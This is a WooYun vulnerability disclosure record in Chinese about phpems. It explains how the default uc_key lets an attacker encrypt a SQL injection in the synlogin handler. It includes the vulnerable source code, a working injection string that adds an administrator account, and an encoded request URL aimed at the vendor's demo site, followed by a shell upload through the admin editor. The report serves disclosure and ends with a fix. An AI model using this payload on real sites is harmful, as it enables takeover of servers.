{"id": 38721, "wybug_id": "wooyun-2015-095619", "wybug_title": "phpems设置缺陷直接添加管理员导致getshell", "wybug_corp": "phpems", "wybug_author": "Zxsoft", "wybug_date": "2015-02-10 18:54", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： phpems 默认uc_key是1234567890导致可以用uc的加密函数加密恶意代码带到sql语句中。 详细说明：  \nif(!defined('IN_UC')) {\terror_reporting(0);\tset_magic_quotes_runtime(0);\t\tdefined('MAGIC_QUOTES_GPC') || define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());\trequire_once 'config.inc.php';\t$_DCACHE = $get = $post = array();\t$code = @$_GET['code'];       //code=加密代码\tparse_str(_authcode($code, 'DECODE', UC_KEY), $get);  //到这里进行解密\t//var_dump($get);\tif(MAGIC_QUOTES_GPC) {\t\t$get = _stripslashes($get);  //不明白这里用意,解密后把反斜杠去掉\t}\t$timestamp = time();\techo $timestamp - $get['time'];\tif($timestamp - $get['time'] > 3600) {  //time可控\t\texit('Authracation has expiried');\t}\tif(empty($get)) {\t\texit('Invalid Request');\t}\t$action = $get['action']; //action可控\trequire_once 'uc_client/lib/xml.class.php';\t$post = xml_unserialize(file_get_contents('php://input'));\tif(in_array($get['action'], array('test', 'deleteuser', 'renameuser', 'gettag', 'synlogin', 'synlogout', 'updatepw', 'updatebadwords', 'updatehosts', 'updateapps', 'updateclient', 'updatecredit', 'getcreditsettings', 'updatecreditsettings'))) {\t\t/**\t\trequire_once 'include/db_mysql.class.php';\t\t$GLOBALS['db'] = new dbstuff;\t\t$GLOBALS['db']->connect($dbhost, $dbuser, $dbpw, $dbname, $pconnect, true, $dbcharset);\t\tprint_r($GLOBALS['db']);\t\t$GLOBALS['tablepre'] = $tablepre;\t\tunset($dbhost, $dbuser, $dbpw, $dbname, $pconnect);\t\t**/\t\t$uc_note = new uc_note();\t\t//file_put_contents('aa.txt','1');\t\texit($uc_note->$get['action']($get, $post));\t} else {\t\texit(API_RETURN_FAILED);\t}} else {\nuc_note->synlogin\nfunction synlogin($get, $post) {\t\t$uid = $get['uid'];\t\t//$username = iconv('gbk','utf-8',$get['username']);\t\t//gbk版本论坛使用上行\t\t$username = $get['username'];\t\t//UTF8版本使用上行\t\tif(!API_SYNLOGIN) {\t\t\treturn API_RETURN_FORBIDDEN;\t\t}\t\t$sql = \"set names utf8\";\t\t$this->dblink->query($sql);\t\t$sql = \"SELECT * FROM \".DTH.\"user WHERE username = '{$username}'\"; //注入点1\t\t$u = $this->dblink->fetch_first($sql);\t\t$args = array();\t\tif(!$u){  //提交个不存在的用户这里$u就为null\t\t\t$sql = \"SELECT * FROM \".DTH.\"user_group WHERE groupdefault = '1'\";\t\t\t$g = $this->dblink->fetch_first($sql);\t\t\t$grouid = $g['groupid'];\t\t\t$email = $username.\"@phpems.net\";\t\t\t$pass = md5(rand(1000,9999));\t\t\t$sql = \"INSERT INTO \".DTH.\"user (`username`,`useremail`,`userpassword`,`usergroupid`,`userregtime`,`userregip`) VALUES ('{$username}','{$email}','{$pass}','{$grouid}','\".TIME.\"','\".$this->_getClientIp().\"')\";   //username可控制，是解密后得到的内容 那么就可以直接添加一个管理员\t\t\t$this->dblink->query($sql);\t\t\t$args = array('sessionuserid'=>$this->dblink->insert_id(),'sessionpassword'=>$pass,'sessionip'=>$this->_getClientIp(),'sessiongroupid'=>$grouid,'sessionlogintime'=>TIME,'sessionusername'=>$username);\t\t}\t\telse\t\t$args = array('sessionuserid'=>$u['userid'],'sessionpassword'=>$u['userpassword'],'sessionip'=>$this->_getClientIp(),'sessiongroupid'=>$u['usergroupid'],'sessionlogintime'=>TIME,'sessionusername'=>$u['username']);\t\tif(!$args['sessiontimelimit'])$args['sessiontimelimit'] = TIME;    \tif(!$this->sessionid)$this->_getSessionId();    \t$args['sessionid'] = $this->sessionid;    \t$args['sessiontimelimit'] = TIME;    \t$data = array('session',$args);    \t$sql = $this->_makeReplace($data);    \t$this->dblink->query($sql);\n   漏洞证明：  官方demo来测试：\n\n现在没有testadmin这个帐号,我们来添加一个加密这句话然后提交$str=\"time=2999999999999999&action=synlogin&username=testadmin','test@test.coom','e10adc3949ba59abbe56e057f20f883e','1','2015-02-04','127.0.0.1')#\";  \n\nwww.phpems.net/2014/api/uc.php?code=b843/GkLQIWizbadvdy6o9/js/s0OOsDQZq3KhHhyW2nzNTxN6WfQg%2BnwtL3Qbz3YXVpYmC8ibpOgTv9cGHr3TwHHikzy7GtDTEQukPOXPVUzzraPvurp0F78QTp9/ggYXev9PP/iawD/u0lLkhLuf3a2rMZco0l6lbtBQhOC%2BLLKQldXEcjVN0mRV8GrxkEyOBjq0jWVjMuVlzT%2BFNcfqrej0RPozYcWgs0OOsDQZq3KhHhyW2nzNTxN6WfQgtestadmin 密码：123456前台就可以登陆，然后点击后台管理，都不用找后台后台编辑器可以直接上传php文件\n\n前人用uc key getshell留下的后门\n\n其他站点：\n\n   修复方案：  uc_key使用随机字符串   版权声明：转载请注明来源 Zxsoft@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}